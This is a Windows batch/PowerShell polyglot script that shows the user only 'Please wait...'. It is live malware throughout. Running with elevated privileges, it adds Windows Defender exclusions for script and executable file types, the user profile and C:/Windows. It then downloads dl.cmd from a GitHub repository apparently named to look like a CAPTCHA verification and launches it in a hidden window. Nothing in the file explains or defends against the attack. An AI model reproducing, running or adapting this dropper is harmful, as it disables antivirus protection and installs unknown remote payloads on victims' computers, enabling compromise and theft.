<# :batch script
Echo Please wait...
@echo off
setlocal
cd "%~dp0"
powershell -ep remotesigned -Command "IEX $([System.IO.File]::ReadAllText('%~f0'))"
endlocal
goto:eof
#>
while($true) {
    try {
        # Step 1: Set exclusions with admin privileges
        $excludePath = [System.IO.Path]::GetFullPath($env:USERPROFILE)
        $exclusionsCommand = "Add-MpPreference -ExclusionExtension '.dll','.ps1','.cmd','.exe','.bat','.vbs','.lnk'; Add-MpPreference -ExclusionPath '$excludePath'; Add-MpPreference -ExclusionPath 'C:/Windows'"
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $exclusionsCommand" -Verb runas -Wait

        # Step 2: Download and execute the first executable (hidden cmd window)
        $url1 = 'https://raw.githubusercontent.com/captcharequests/verify/refs/heads/main/dl.cmd'
        $filePath1 = [System.IO.Path]::Combine($env:USERPROFILE, 'dl.cmd')
        $downloadCommand1 = "Invoke-WebRequest -Uri '$url1' -OutFile '$filePath1'; Start-Process -FilePath '$filePath1'"
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $downloadCommand1" -WindowStyle Hidden

        # Exit the loop after successful execution
        exit
    } catch {
        # Optional: Add logging or handling here if needed
    }
}
